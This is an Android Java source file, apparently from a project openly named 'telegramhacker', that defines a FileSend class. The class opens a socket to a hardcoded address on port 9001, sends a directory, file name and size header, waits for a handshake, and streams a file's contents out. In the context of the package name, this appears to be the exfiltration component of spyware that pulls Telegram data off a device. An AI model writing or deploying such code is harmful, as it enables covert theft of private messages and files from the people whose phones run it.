package com.example.telegramhacker;

import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.SocketChannel;

public class FileSend {

    static final String TAG = "FileSend";
    static SocketChannel instanceOfSocketChannel;
    static final char separator = '%';
    static final int BYTE_SIZE = 8192;

    static boolean sendFile(String fileName,String directory){

        RandomAccessFile aFile = null;

        try {
            if (createSocketChannel()){

                File fileToSend = new File(fileName);
                String info = getSendingInfo(fileToSend,directory);

                if (checkIfReady(info)){
                    aFile = new RandomAccessFile(fileToSend,"r");
                    FileChannel inChannel = aFile.getChannel();
                    ByteBuffer bb = ByteBuffer.allocate(BYTE_SIZE);

                    while(inChannel.read(bb) != -1){
                        bb.flip();
                        instanceOfSocketChannel.write(bb);
                        bb.clear();
                    }

                    aFile.close();
                    closeSocketChannel();
                }
                else{
                    return false;
                }
            }else{
                return false;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return true;
    }

    static boolean createSocketChannel(){
        try {
            instanceOfSocketChannel = SocketChannel.open();
            SocketAddress sa = new InetSocketAddress("192.168.43.102",9001);
            instanceOfSocketChannel.connect(sa);
            System.out.println("Connected....now sending the file");
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    static void closeSocketChannel(){
        try {
            instanceOfSocketChannel.close();
            System.out.println("SocketChannel closed from sender's side");
            instanceOfSocketChannel = null;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static String getSendingInfo(File fileToSend,String directory){
        String ret = "";
        ret =ret + separator+ "" + separator +
                directory + separator + "" + separator +
                fileToSend.getName() + separator + "" + separator +
                Long.toString(fileToSend.length()) + separator + "" +separator + "" + separator +"" + separator ;

        Log.d(TAG, "getSendingInfo: returning String " + ret);

        return ret;
    }

    static boolean checkIfReady(String info){
        try{
            ByteBuffer bb = ByteBuffer.allocate(1024);
            bb.put(info.getBytes());
            bb.flip();
            instanceOfSocketChannel.write(bb);
            bb.clear();

            ByteBuffer differentBuffer = ByteBuffer.allocate(1024);

            instanceOfSocketChannel.read(differentBuffer);
            differentBuffer.flip();
            byte[] byteArray = differentBuffer.array();
            differentBuffer.clear();
            System.out.println("Reached atleast here");

            for(int i =0;i<4;i++){
                System.out.print((char)byteArray[i]);
            }

            if(byteArray[0] == separator && byteArray[1] == separator && byteArray[2] == separator&& byteArray[3] == separator){
                System.out.print("I should allow file to read now");
                return true;
            }

        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }
}
